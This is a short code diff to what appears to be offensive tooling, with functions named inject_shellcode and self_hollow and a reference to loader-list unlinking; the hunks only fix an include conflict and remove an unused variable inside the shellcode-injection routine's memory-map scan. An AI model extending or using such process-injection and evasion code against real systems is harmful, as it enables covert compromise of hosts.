@@ -404,7 +404,11 @@ inline bool self_hollow() {
 #include <sys/user.h>
 #include <sys/mman.h>
 #include <sys/uio.h>
-#include <linux/elf.h>
+// NOTE: <linux/elf.h> is deliberately NOT included. It conflicts with glibc's
+// <elf.h> (pulled in by <link.h> in peb_unlink.h): both typedef Elf64_* names,
+// with incompatible underlying types, so the two cannot coexist. This file
+// uses no Elf types anyway, so dropping the include is both correct and what
+// keeps the Linux build compiling.
 #include <cerrno>
 #include <cstring>
 #include <cstdint>
@@ -571,7 +575,6 @@ inline std::string inject_shellcode(pid_t pid, const std::vector<unsigned char>&
     }
 
     unsigned long targetAddr = 0;
-    unsigned long regionSize = 0;
     char line[512];
     while (fgets(line, sizeof(line), maps)) {
         unsigned long start, end;
@@ -581,7 +584,6 @@ inline std::string inject_shellcode(pid_t pid, const std::vector<unsigned char>&
                 unsigned long sz = end - start;
                 if (sz >= shellcode.size()) {
                     targetAddr = start;
-                    regionSize = sz;
                     break;
                 }
             }
